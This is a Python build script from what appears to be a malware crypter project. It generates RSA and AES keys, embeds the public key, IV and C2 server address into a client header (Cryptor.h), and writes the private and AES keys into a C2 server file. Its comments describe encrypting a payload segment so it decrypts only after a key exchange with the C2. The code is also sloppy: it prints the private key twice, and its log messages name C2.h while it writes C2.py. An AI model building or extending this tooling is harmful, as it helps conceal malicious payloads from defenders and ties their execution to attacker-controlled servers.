# This file is responsible for generating a public private key pair and
# Storing those keys into separate header files.
# The first file is to store the public key to be embedded into the cryptor
# the private keys will then be stored in another header file for the
#
# This file will then generate a symmetric key to be used to encrypt the
# .payload segment. This key will be stored in the C2 header.
#
# the client will generate a one time pad and send it to the c2. the c2 will send
# the key for decrypting the payload segment back. the payload will be decrypted
# by the key stored in the c2

import os
import base64
import sys
import re
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
IVLEN = 0x10
RSAKEYLEN = 0;
AESKEYLEN = 0;
IPADDR_SVR = "";
PORT_SVR= 0;


def HeaderComment():
    print("/**\n * THIS FILE IS AUTOMATICALLY GENERATED VIA "+os.path.basename(__file__));
    print(" * ANY MODIFICATIONS TO THIS HEADER WILL BE LOST UPON THE NEXT AUTO GENERATION");
    print(" * ")
    print(" * CUSTOM CONFIGURATIONS SHOULD BE DONE IN THE (Conf) FILE, UPPON RUNNING THE MAKE");
    print(" * FILE FOR THE FIRST TIME THIS CONFIGURATION SHOULD BE AUTOMATICALLY GENERATED FOR YOU");
    print(" * THE DEFAULT CONFIGURATIONS ARE RECOMMENDED");
    print(" * ")
    print(" * FOR MORE GRANULAR CONTROL RENAME Conf.default TO Conf AND EDIT THE FILE DIRECTLY");
    print(" */")

def PyComment():
    print("#\n# THIS FILE IS AUTOMATICALLY GENERATED VIA "+os.path.basename(__file__));
    print("# ANY MODIFICATIONS TO THIS Py SCRIPR WILL BE LOST UPON THE NEXT AUTO GENERATION");
    print("# ")
    print("# CUSTOM CONFIGURATIONS SHOULD BE DONE IN THE (Conf) FILE, UPPON RUNNING THE MAKE");
    print("# FILE FOR THE FIRST TIME THIS CONFIGURATION SHOULD BE AUTOMATICALLY GENERATED FOR YOU");
    print("# THE DEFAULT CONFIGURATIONS ARE RECOMMENDED");
    print("# ")
    print("# FOR MORE GRANULAR CONTROL RENAME Conf.default TO Conf AND EDIT THE FILE DIRECTLY");
    print("#")

def HeadderCommonDef():
    print("#define IVENCLEN", len(IV_STR));
    print("#define IVLEN", IVLEN);
    print("#define RSAKEYLEN", RSAKEYLEN)
    print("#define AESKEYLEN", AESKEYLEN)
    print("#define PORT_SVR \""+str(PORT_SVR)+"\"")

def PyCommonDef():
    print("IVENCLEN = ", len(IV_STR));
    print("IVLEN = ", IVLEN);
    print("RSAKEYLEN = ", RSAKEYLEN)
    print("AESKEYLEN = ", AESKEYLEN)
    print("PORT_SVR = "+str(PORT_SVR))

def LogPrompt(st):
    print ("\t"+os.path.basename(__file__)+">>\t"+st);

def PrintIV():
    print("#define IV \"", end='');
    print(IV_STR, end='');
    print("\"");


try:
    with open ('Conf', 'r') as f:
        for line in f.readlines():
            if(r1 := re.match("AES_KEY_LEN = ([0-9]+)",line)):
                AESKEYLEN = int(r1.group(1));
            if(r1 := re.match("RSA_KEY_LEN = ([0-9]+)",line)):
                RSAKEYLEN = int(r1.group(1));
            if(r1 := re.match("IPADDR_SVR = ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)",line)):
                IPADDR_SVR = r1.group(1); # its to late if the ip address is messed up,
                                          # that should have been checked in conf, anyone
                                          # messing with creating there own conf file should
                                          # know what they are doing
            if(r1 := re.match("PORT_SVR = ([0-9]+)",line)):
                PORT_SVR = r1.group(1); # its to late if the ip address is messed up,
                                          # that should have been checked in conf, anyone
                                          # messing with creating there own conf file should
                                          # know what they are doing
except IOError:
    print("something went wrong");
    sys.exit(-1);

LogPrompt("Generating "+str(RSAKEYLEN)+" bit Public/Private key pair!");
sys.stdout.flush();
rsakey = RSA.generate(RSAKEYLEN);
LogPrompt(str(RSAKEYLEN)+" bit public key generated");
LogPrompt("Generating symmetric AES key ");
aeskey = get_random_bytes(AESKEYLEN);
LogPrompt(str(AESKEYLEN*8)+" bit key generated");
LogPrompt ("Generating IV");
IV = get_random_bytes(IVLEN);
IV_STR = base64.b64encode(IV).decode("utf-8")
LogPrompt("Generating Cryptor.h ");
stdo =sys.stdout;


with open ('./CL_src/Cryptor.h', 'w') as f:
    sys.stdout = f;
    HeaderComment();
    pubkey = rsakey.publickey();
    print("#define PUBKEY \"", end='');
    pubkeystr = pubkey.exportKey(format='DER',pkcs=1);
    #r1 = re.match("b'(.*).$",pubkeystr);
    er1 = base64.b64encode(pubkeystr).decode("utf-8");
    #print(pubkeystr, end='');
    print(er1, end='');
    print ("\"");
    print("\n#define certLen ", end='');
    #print(len(pubkeystr));
    print(len(pubkeystr));
    PrintIV()
    HeadderCommonDef();
    print("#define IPADDR_SVR \""+IPADDR_SVR+"\"");
    sys.stdout= stdo;

LogPrompt("Cryptor.h has been generated ");
LogPrompt("Generating C2.h");

with open ('./SVR_SRC/C2.py', 'w') as f:
    sys.stdout = f;
    PyComment();
    priv_key = rsakey.exportKey();
    print("PRVKEY = \"", end='');
    print(priv_key, end='');
    priv_keystr = str(priv_key);
    r1 = re.match("b'(.*?)'",priv_keystr);
    print(priv_keystr, end='');
    print("\"");
    print("AESKEY = \"", end='');
    print(base64.b64encode(aeskey).decode("utf-8"), end='');
    print("\"");
    print("IV = \"", end='');
    print(IV_STR, end='');
    print("\"");
    PyCommonDef();
    sys.stdout=stdo;

LogPrompt("C2.h has been generated");
